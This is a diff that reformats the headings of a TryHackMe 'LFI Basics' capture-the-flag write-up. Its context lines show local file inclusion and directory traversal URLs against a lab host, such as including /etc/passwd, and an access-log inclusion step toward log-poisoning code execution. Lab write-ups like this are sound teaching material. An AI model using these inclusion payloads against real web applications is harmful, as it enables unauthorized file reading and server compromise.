@@ -7,7 +7,9 @@ featured-image:  thm/lfiBasics/theme.png
 featured-image-alt: LFI Basics
 ---
 
-It's a write-up about the room : [Try Hack Me - Room : LFI Basics](https://tryhackme.com/room/lfibasics)# Task 1 - local File Inclusion
+It's a write-up about the room : [Try Hack Me - Room : LFI Basics](https://tryhackme.com/room/lfibasics)
+
+# [Task 1] - Local File Inclusion
 
 * What's the message you get when you include the home.html?
 
@@ -17,7 +19,7 @@ We went on `http://ip_machine/lfi/lfi.php/?page=home.html` and the message was *
 
 We read the passwd file : `http://ip_machine/lfi/lfi.php/?page=/etc/passwd` and found the user **lfi**.
 
-## Task 2 - Local File Inclusion using Directory Traversal
+# [Task 2] - Local File Inclusion using Directory Traversal
 
 * Add the "?page=" parameter, and try to include the home page again. Does it work (Yes/No)? **No** 
 
@@ -25,7 +27,7 @@ We read the passwd file : `http://ip_machine/lfi/lfi.php/?page=/etc/passwd` and 
 
 `http://ip_machine/lfi2/lfi.php/?page=../creditcard` and found **1111-2222-3333-4444**.
 
-## Task 3 - Reaching RCE using LFI and log poisoning
+# [Task 3] - Reaching RCE using LFI and log poisoning
 
 `http://ip_machine/lfi/lfi.php/?page=/var/log/apache2/access.log`
 
